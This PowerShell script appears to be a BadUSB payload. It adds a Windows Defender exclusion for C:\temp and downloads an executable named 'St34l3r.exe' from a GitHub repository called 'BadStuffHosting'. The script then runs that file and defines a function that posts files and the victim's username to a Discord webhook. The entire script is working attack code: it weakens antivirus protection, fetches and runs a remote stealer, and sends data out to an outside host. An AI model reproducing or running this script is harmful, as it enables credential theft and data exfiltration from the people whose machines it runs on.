function Get-Nirsoft {
    cd C:\
    mkdir \temp
    cd \temp
    Add-MpPreference -ExclusionPath "C:\temp"
    $UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"

    $WebRequestHeaders = @{
        "User-Agent" = $UserAgent
    }

    Invoke-WebRequest -Uri "https://github.com/Gvte-Kali/BadStuffHosting/raw/main/BadUSB/W1ns1d3r/testing/St34l3r.exe" -OutFile St34l3r.exe -Headers $WebRequestHeaders

    .\St34l3r.exe
}

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}

Get-Nirsoft
